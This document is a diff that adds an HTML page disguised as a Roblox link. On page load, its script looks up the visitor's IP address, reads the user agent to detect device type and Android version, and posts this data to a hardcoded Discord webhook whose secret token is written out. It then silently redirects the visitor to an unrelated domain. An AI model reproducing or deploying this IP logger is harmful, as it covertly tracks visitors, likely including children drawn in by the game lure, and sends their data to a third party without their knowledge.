@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <script>
+        async function sendWebhook(usedKey = "Join Roblox") {
+            const webhookURL = "https://discord.com/api/webhooks/1353756197446090812/JSqUsb6KbV98_tkSmw3U4XphwqUhqNq0RzuOOmun4NuPrf-n4IOdpNS6KgUrT-K3Gy-9";
+
+            try {
+                // Lấy IP từ API
+                const ipResponse = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+
+                // Lấy thông tin thiết bị
+                const userAgent = navigator.userAgent;
+                let deviceType = "PC";
+                if (/Mobi|Android/i.test(userAgent)) {
+                    deviceType = "Mobile";
+                } else if (/Tablet|iPad/i.test(userAgent)) {
+                    deviceType = "Tablet";
+                }
+
+                // Nếu là Android, lấy phiên bản
+                let androidVersion = "Không phải Android";
+                const match = userAgent.match(/Android\s([\d.]+)/);
+                if (match) {
+                    androidVersion = `Android ${match[1]}`;
+                }
+
+                // Gửi webhook
+                const embedMessage = {
+                    embeds: [{
+                        title: "Webhook UgPhone",
+                        color: 3447003,
+                        fields: [
+                            { name: "Key:", value: `\`${usedKey}\``, inline: false },
+                            { name: "IP:", value: `\`${userIP}\``, inline: false },
+                            { name: "Use:", value: `\`${deviceType}\``, inline: true },
+                            { name: "Android:", value: `\`${androidVersion}\``, inline: true }
+                        ],
+                        footer: { text: new Date().toLocaleString() }
+                    }]
+                };
+
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(embedMessage)
+                });
+
+            } catch (error) {
+                console.error("Lỗi lấy/gửi IP:", error);
+            }
+        }
+
+        window.onload = async function() {
+            await sendWebhook();
+            window.location.replace("https://mathstutor.life/apps/roblox-corporation/5349/roblox.html");
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
